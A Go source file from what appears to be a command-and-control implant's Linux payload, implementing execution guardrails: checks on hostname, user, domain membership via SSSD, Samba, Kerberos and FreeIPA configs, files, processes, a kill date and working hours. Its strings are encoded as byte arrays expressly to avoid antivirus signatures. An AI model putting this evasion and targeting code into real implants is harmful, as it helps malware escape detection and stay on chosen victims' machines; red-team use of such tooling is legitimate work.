// server/docker/payloads/Linux/exec_requirements_linux.go
//go:build linux
// +build linux

package main

import (
	"bufio"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v4/process"
)

// Build-time variables that will be set via ldflags
var (
	// Safety check variables - set at build time
	safetyHostname       string = ""
	safetyUsername       string = ""
	safetyDomain         string = ""
	safetyFilePath       string = ""
	safetyFileMustExist  string = "false"
	safetyProcess        string = ""
	safetyKillDate       string = ""
	safetyWorkHoursStart string = ""
	safetyWorkHoursEnd   string = ""
)

// Exec requirements strings (constructed to avoid static signatures)
var (
	// File paths
	erPathEtcHostname = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65})                                                                         // /etc/hostname
	erPathSssdConf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/sssd/sssd.conf
	erPathSmbConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x61, 0x6d, 0x62, 0x61, 0x2f, 0x73, 0x6d, 0x62, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/samba/smb.conf
	erPathKrb5Conf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x6b, 0x72, 0x62, 0x35, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                                                   // /etc/krb5.conf
	erPathIpaConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x69, 0x70, 0x61, 0x2f, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                         // /etc/ipa/default.conf
	erPathProc        = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63})                                                                                                                         // /proc
	erPathTildeFwd    = string([]byte{0x7e, 0x2f})                                                                                                                                           // ~/

	// Environment variable names
	erEnvUser    = string([]byte{0x55, 0x53, 0x45, 0x52})                                           // USER
	erEnvLogname = string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45})                         // LOGNAME

	// Config file patterns
	erPatternDomainsEq  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x20, 0x3d})       // domains =
	erPatternDomainsEq2 = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x3d})             // domains=
	erPatternWorkgroup  = string([]byte{0x77, 0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70})       // workgroup
	erPatternRealm      = string([]byte{0x72, 0x65, 0x61, 0x6c, 0x6d})                               // realm
	erPatternDefRealm   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x6d}) // default_realm
	erPatternDomainEq   = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x20, 0x3d})             // domain =
	erPatternDomainEq2  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x3d})                   // domain=

	// Proc file names
	erProcCmdline = string([]byte{0x63, 0x6d, 0x64, 0x6c, 0x69, 0x6e, 0x65})                         // cmdline
	erProcComm    = string([]byte{0x63, 0x6f, 0x6d, 0x6d})                                           // comm

	// String literals
	erWordTrue = string([]byte{0x74, 0x72, 0x75, 0x65})                                              // true

	// Time format strings
	erTimeFmtFull = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
)

// PerformSafetyChecks runs all configured safety checks
// Returns true if all checks pass, false otherwise
func PerformSafetyChecks() bool {
	// If no safety checks are configured, allow execution
	if !hasSafetyChecks() {
		return true
	}

	// Silent checks - no output in production
	// Uncomment for debugging only
	// fmt.Println("[*] Performing safety checks...")

	// Check hostname
	if safetyHostname != "" {
		if !checkHostname(safetyHostname) {
			return false
		}
	}

	// Check username
	if safetyUsername != "" {
		if !checkUsername(safetyUsername) {
			return false
		}
	}

	// Check domain (if system is domain-joined via SSSD, Winbind, etc.)
	if safetyDomain != "" {
		if !checkDomain(safetyDomain) {
			return false
		}
	}

	// Check file existence
	if safetyFilePath != "" {
		mustExist := safetyFileMustExist == erWordTrue
		if !checkFile(safetyFilePath, mustExist) {
			return false
		}
	}

	// Check process
	if safetyProcess != "" {
		if !checkProcess(safetyProcess) {
			return false
		}
	}

	// Check kill date
	if safetyKillDate != "" {
		if !checkKillDate(safetyKillDate) {
			return false
		}
	}

	// Check working hours
	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
		if !checkWorkingHours(safetyWorkHoursStart, safetyWorkHoursEnd) {
			return false
		}
	}

	return true
}

// hasSafetyChecks returns true if any safety checks are configured
func hasSafetyChecks() bool {
	return safetyHostname != "" ||
		safetyUsername != "" ||
		safetyDomain != "" ||
		safetyFilePath != "" ||
		safetyProcess != "" ||
		safetyKillDate != "" ||
		(safetyWorkHoursStart != "" && safetyWorkHoursEnd != "")
}

// checkHostname verifies the system hostname matches the expected value
func checkHostname(expected string) bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	// Also check /etc/hostname as a fallback
	if !strings.EqualFold(hostname, expected) {
		if data, err := os.ReadFile(erPathEtcHostname); err == nil {
			hostname = strings.TrimSpace(string(data))
		}
	}

	// Case-insensitive comparison
	return strings.EqualFold(hostname, expected)
}

// checkUsername verifies the current username matches the expected value
func checkUsername(expected string) bool {
	currentUser, err := user.Current()
	if err != nil {
		// Fallback to environment variable
		username := os.Getenv(erEnvUser)
		if username == "" {
			username = os.Getenv(erEnvLogname)
		}
		return strings.EqualFold(username, expected)
	}

	// Case-insensitive comparison
	return strings.EqualFold(currentUser.Username, expected)
}

// checkDomain checks if the system is joined to a domain
func checkDomain(expected string) bool {
	// Check SSSD configuration
	if domain := checkSSSDDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Check Samba/Winbind
	if domain := checkSambaDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Check Kerberos realm
	if realm := checkKerberosRealm(); realm != "" {
		if strings.EqualFold(realm, expected) {
			return true
		}
	}

	// Check FreeIPA
	if domain := checkFreeIPADomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	return false
}

// checkSSSDDomain checks SSSD configuration for domain membership
func checkSSSDDomain() string {
	file, err := os.Open(erPathSssdConf)
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, erPatternDomainsEq) || strings.HasPrefix(line, erPatternDomainsEq2) {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				domain := strings.TrimSpace(parts[1])
				// Return first domain if multiple
				if strings.Contains(domain, ",") {
					domains := strings.Split(domain, ",")
					return strings.TrimSpace(domains[0])
				}
				return domain
			}
		}
	}

	return ""
}

// checkSambaDomain checks Samba configuration for domain membership
func checkSambaDomain() string {
	file, err := os.Open(erPathSmbConf)
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		lineLower := strings.ToLower(line)

		// Look for "workgroup = DOMAIN" or "realm = domain.com"
		if strings.HasPrefix(lineLower, erPatternWorkgroup) || strings.HasPrefix(lineLower, erPatternRealm) {
			if strings.Contains(line, "=") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}

	return ""
}

// checkKerberosRealm checks for Kerberos configuration
func checkKerberosRealm() string {
	file, err := os.Open(erPathKrb5Conf)
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(strings.ToLower(line), erPatternDefRealm) {
			if strings.Contains(line, "=") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}

	return ""
}

// checkFreeIPADomain checks for FreeIPA/IdM domain membership
func checkFreeIPADomain() string {
	// Check /etc/ipa/default.conf
	file, err := os.Open(erPathIpaConf)
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, erPatternDomainEq) || strings.HasPrefix(line, erPatternDomainEq2) {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				return strings.TrimSpace(parts[1])
			}
		}
	}

	return ""
}

// checkFile verifies file existence based on the requirement
func checkFile(path string, mustExist bool) bool {
	// Expand ~ to home directory if present
	if strings.HasPrefix(path, erPathTildeFwd) {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}

	_, err := os.Stat(path)

	if mustExist {
		// File must exist - check passes if no error
		return err == nil
	} else {
		// File must NOT exist - check passes if error (file not found)
		return os.IsNotExist(err)
	}
}

// checkProcess checks if a specific process is running
func checkProcess(processName string) bool {
	// First try the /proc filesystem approach
	if checkProcessViaProc(processName) {
		return true
	}

	// Fallback to gopsutil
	return checkProcessGopsutil(processName)
}

// checkProcessViaProc checks for process via /proc filesystem
func checkProcessViaProc(processName string) bool {
	entries, err := os.ReadDir(erPathProc)
	if err != nil {
		return false
	}

	for _, entry := range entries {
		// Skip non-PID directories
		if !entry.IsDir() {
			continue
		}

		// Check if directory name is a PID (all digits)
		pid := entry.Name()
		isPID := true
		for _, char := range pid {
			if char < '0' || char > '9' {
				isPID = false
				break
			}
		}

		if !isPID {
			continue
		}

		// Read the cmdline file to get process name
		cmdlinePath := filepath.Join(erPathProc, pid, erProcCmdline)
		cmdlineBytes, err := os.ReadFile(cmdlinePath)
		if err != nil {
			continue
		}

		// Convert null-separated cmdline to string
		cmdline := string(cmdlineBytes)
		cmdline = strings.ReplaceAll(cmdline, "\x00", " ")

		// Check if process name matches
		if strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
			return true
		}

		// Also check comm file for just the process name
		commPath := filepath.Join(erPathProc, pid, erProcComm)
		commBytes, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}

		comm := strings.TrimSpace(string(commBytes))
		if strings.EqualFold(comm, processName) {
			return true
		}
	}

	return false
}

// checkProcessGopsutil uses gopsutil as fallback for process checking
func checkProcessGopsutil(processName string) bool {
	processes, err := process.Processes()
	if err != nil {
		return false
	}

	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}

		// Check both exact name and if the process name is contained
		if strings.EqualFold(name, processName) {
			return true
		}

		// Also check command line
		cmdline, err := p.Cmdline()
		if err == nil && strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
			return true
		}
	}

	return false
}

// checkKillDate verifies the current date is before the kill date
func checkKillDate(killDateStr string) bool {
	// Parse kill date (format: "2006-01-02 15:04:05")
	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
	if err != nil {
		// If we can't parse the kill date, fail safe and don't run
		return false
	}

	// Check if current time is before kill date
	return time.Now().Before(killDate)
}

// checkWorkingHours verifies the current time is within working hours
func checkWorkingHours(startTime, endTime string) bool {
	now := time.Now()

	// Parse start time (format: "HH:MM")
	startParts := strings.Split(startTime, ":")
	if len(startParts) != 2 {
		return false
	}

	var startHour, startMin int
	fmt.Sscanf(startParts[0], "%d", &startHour)
	fmt.Sscanf(startParts[1], "%d", &startMin)

	// Parse end time
	endParts := strings.Split(endTime, ":")
	if len(endParts) != 2 {
		return false
	}

	var endHour, endMin int
	fmt.Sscanf(endParts[0], "%d", &endHour)
	fmt.Sscanf(endParts[1], "%d", &endMin)

	// Create time objects for today with specified hours
	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())

	// Check if current time is within range
	return now.After(startToday) && now.Before(endToday)
}
